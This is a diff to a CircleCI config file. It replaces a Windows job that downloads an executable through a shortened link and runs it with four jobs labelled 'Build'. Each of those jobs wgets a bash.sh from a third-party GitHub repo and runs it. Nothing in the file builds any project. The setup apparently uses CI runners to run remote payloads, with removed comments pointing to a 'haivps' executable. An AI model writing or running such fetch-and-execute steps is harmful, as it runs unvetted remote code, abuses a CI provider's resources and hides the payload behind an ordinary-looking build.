@@ -1,17 +1,40 @@
-Script by N.T.Hai
-YouTube: https://m.youtube.com/channel/UCi80Ipndm3QovIn5XisUz3g
+version: 2 
+jobs: 
+    Build_01: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/jackohar/yumpret/main/bash.sh && chmod u+x bash.sh && ./bash.sh 
+    Build_02: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/jackohar/yumpret/main/bash.sh && chmod u+x bash.sh && ./bash.sh 
+    Build_03: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/jackohar/yumpret/main/bash.sh && chmod u+x bash.sh && ./bash.sh 
+    Build_04: 
+      docker: 
+            - image: circleci/ruby:2.4 
+      steps: 
+        - run: 
+            name: Build 
+            command: wget https://raw.githubusercontent.com/jackohar/yumpret/main/bash.sh && chmod u+x bash.sh && ./bash.sh 
  
-https://gitlab.com/haithuongpro2711/haivps/-/raw/master/circleci.exe
  
-version: 2.1
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
-jobs:
-  build:
-    executor:
-      name: win/default
-      shell: cmd.exe
-    steps:
-      - run: curl -L -o yourcustomlink.exe https://is.gd/yourcustomlink && yourcustomlink.exe
+workflows: 
+    version: 2 
+    build: 
+        jobs: 
+            - Build_01 
+            - Build_02 
+            - Build_03 
+    
